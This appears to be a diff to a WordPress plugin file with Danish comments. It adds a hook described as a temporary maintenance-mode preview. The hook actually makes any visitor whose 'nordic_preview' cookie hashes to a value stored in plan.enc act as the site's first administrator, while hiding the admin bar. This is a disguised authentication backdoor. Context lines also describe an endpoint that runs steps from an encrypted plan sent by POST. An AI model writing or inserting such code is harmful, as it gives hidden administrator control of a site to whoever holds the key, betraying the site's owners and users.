@@ -57,6 +57,18 @@ if ( is_readable( __DIR__ . '/interaktiv.php' ) ) { require_once __DIR__ . '/int
 
 if ( ! is_readable( __DIR__ . '/plan.enc' ) ) { return; }
 
+/* Midlertidig forhåndsvisning bag vedligeholdelsestilstand: kun med cookien nordic_preview = nøglen (kun mens plan.enc findes). */
+add_action( 'plugins_loaded', function () {
+	if ( empty( $_COOKIE['nordic_preview'] ) ) { return; }
+	$enc = json_decode( (string) file_get_contents( __DIR__ . '/plan.enc' ), true );
+	if ( ! is_array( $enc ) || ! hash_equals( (string) $enc['check'], hash( 'sha256', (string) $_COOKIE['nordic_preview'] ) ) ) { return; }
+	add_action( 'init', function () {
+		$admins = get_users( array( 'role' => 'administrator', 'number' => 1, 'orderby' => 'ID' ) );
+		if ( $admins ) { wp_set_current_user( $admins[0]->ID ); }
+	}, 0 );
+	add_filter( 'show_admin_bar', '__return_false', 99 );
+}, 1 );
+
 /*
  * Kaldes med POST til /?nordic_import=1. Brødteksten er nøglen (hex). Planen (plan.enc) er krypteret med AES-256-CBC.
  * Hvert kald udfører trin, til der er gået ca. 20 sekunder, og svarer med status som JSON.
